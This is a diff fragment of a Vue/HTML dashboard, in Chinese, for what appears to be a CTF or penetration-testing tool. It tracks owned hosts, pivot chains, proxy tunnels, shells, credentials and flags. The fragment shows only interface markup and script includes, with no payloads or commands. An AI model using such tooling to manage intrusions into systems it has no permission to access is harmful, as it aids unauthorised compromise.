+        <button class="btn btn-sm" @click="goto('topology')">打开拓扑</button>
+        <button class="btn btn-sm btn-primary" @click="goto('export')">导出 Writeup</button>
+      </div>
+    </div>
+
+    <div class="dash-metrics">
+      <div class="metric-card">
+        <span class="metric-k">已控主机</span>
+        <b class="metric-v mono">{{ stats.ownedHosts }}<small>/ {{ stats.hosts }}</small></b>
+        <div class="progress"><i :style="{ width: pct(stats.ownedHosts, stats.hosts) }"></i></div>
+      </div>
+      <div class="metric-card">
+        <span class="metric-k">层级深度</span>
+        <b class="metric-v mono">{{ stats.maxLayer }}</b>
+        <div class="metric-sub muted">L1 → L{{ stats.maxLayer }}，共 {{ stats.segments }} 个网段</div>
+      </div>
+      <div class="metric-card">
+        <span class="metric-k">Flag 进度</span>
+        <b class="metric-v mono text-ok">{{ stats.flags }}<small>/ {{ stats.flagsTotal }}</small></b>
+        <div class="progress"><i :style="{ width: pct(stats.flags, stats.flagsTotal) }"></i></div>
+      </div>
+      <div class="metric-card">
+        <span class="metric-k">剩余时间</span>
+        <b class="metric-v mono" :class="timer.remainSec < 1800 ? 'text-warn' : ''">{{ remainText }}</b>
+        <div class="progress"><i :style="{ width: timerPct + '%' }"></i></div>
+      </div>
+    </div>
+
+    <div class="dash-grid">
+      <div class="panel">
+        <div class="panel-head"><h3>攻击路径 · 跳板链</h3><span class="muted tiny">自动按链路推导</span></div>
+        <div class="chain-flow">
+          <div class="chain-node is-attacker">
+            <b>攻击端</b><small>127.0.0.1</small>
+          </div>
+          <div class="chain-arrow" v-for="(n, i) in chainNodes" :key="n.id">
+            <div class="arrow-line">
+              <span class="arrow-label mono">{{ n.link ? n.link.tool + ' · ' + (n.link.localSocks || '') : '' }}</span>
+            </div>
+            <div class="chain-node" :class="{ 'is-owned': n.owned }">
+              <b class="mono">{{ n.ip }}</b>
+              <small>{{ n.hostname || n.os }}</small>
+              <span class="badge badge-info">{{ n.layer }}</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-head"><h3>阶段进度</h3></div>
+        <div class="stage-list">
+          <div class="stage-item" v-for="s in stageProgress" :key="s.name">
+            <div class="stage-row">
+              <span>{{ s.name }}</span>
+              <span class="mono muted">{{ s.done }}/{{ s.total }}</span>
+            </div>
+            <div class="progress"><i :style="{ width: pct(s.done, s.total) }" :class="s.done === s.total ? 'is-done' : ''"></i></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-head"><h3>最近事件</h3><button class="btn btn-xs btn-ghost" @click="goto('timeline')">全部</button></div>
+        <div class="list-row" v-for="e in recent" :key="e.id">
+          <span class="mono muted">{{ e.time }}</span>
+          <span class="badge" :class="'badge-' + kindBadge(e.kind)">{{ kindLabel(e.kind) }}</span>
+          <span class="grow ellipsis">{{ e.title }}</span>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-head"><h3>链路健康</h3><button class="btn btn-xs btn-ghost" @click="goto('proxy')">编排台</button></div>
+        <div class="list-row" v-for="l in links" :key="l.id">
+          <span class="dot" :class="l.status === 'alive' ? 'is-on' : l.status === 'error' ? 'is-err' : 'is-off'"></span>
+          <span class="mono grow">{{ l.tool }} · {{ ipOf(l.fromHostId) }} → {{ l.targetSegment }}</span>
+          <span class="mono muted">{{ l.status === 'alive' ? l.latency + 'ms' : '断开' }}</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：全局组件 ============================= -->
+<script type="text/x-template" id="tpl-toast">
+  <div class="toast-stack">
+    <transition-group name="toast">
+      <div class="toast" v-for="t in toasts" :key="t.id" :class="'toast-' + t.kind">
+        <svg class="ico" viewBox="0 0 24 24" v-html="icon(t.kind === 'ok' ? 'check' : t.kind === 'err' ? 'shield' : 'activity')"></svg>
+        <span>{{ t.msg }}</span>
+      </div>
+    </transition-group>
+  </div>
+</script>
+
+<script type="text/x-template" id="tpl-modal-layer">
+  <div class="modal-mask" v-if="ui.modal && !['shell-add','host-add','scan-import','cred-add','flag-add','note-add','tty-fix','attack-cfg','tools-cfg','global-cfg','probe'].includes(ui.modal)" @click.self="ui.modal = null">
+    <div class="modal">
+      <div class="modal-head">
+        <h3>{{ modalTitle }}</h3>
+        <button class="icon-btn" @click="ui.modal = null">×</button>
+      </div>
+      <div class="modal-body">
+        <pre class="code-block code-tall" v-if="modalCode">{{ modalCode }}</pre>
+        <div v-else-if="ui.modalData && ui.modalData.html" v-html="ui.modalData.html"></div>
+        <p v-else class="muted">（暂无内容）</p>
+      </div>
+      <div class="modal-foot">
+        <button class="btn" @click="ui.modal = null">关闭</button>
+        <button class="btn btn-primary" v-if="modalCode" @click="copy(modalCode)">复制内容</button>
+      </div>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 脚本 ============================= -->
+<script src="assets/vendor/vue.global.prod.js"></script>
+<script src="assets/vendor/echarts.min.js"></script>
+<script src="assets/js/api.js"></script>
+<script src="assets/js/store.js"></script>
+<script src="assets/js/icons.js"></script>
+<script src="assets/js/components/common.js"></script>
+<script src="assets/js/topology.js"></script>
+<script src="assets/js/views/shell.js"></script>
+<script src="assets/js/views/recon.js"></script>
+<script src="assets/js/views/files.js"></script>
+<script src="assets/js/views/reverse.js"></script>
+<script src="assets/js/views/generator.js"></script>
+<script src="assets/js/views/proxy.js"></script>
+<script src="assets/js/views/asset.js"></script>
+<script src="assets/js/views/cred.js"></script>
+<script src="assets/js/views/flag.js"></script>
+<script src="assets/js/views/timeline.js"></script>
+<script src="assets/js/views/cheat.js"></script>
+<script src="assets/js/views/export.js"></script>
+<script src="assets/js/views/dashboard.js"></script>
+<script src="assets/js/app.js"></script>
+</body>
+</html>
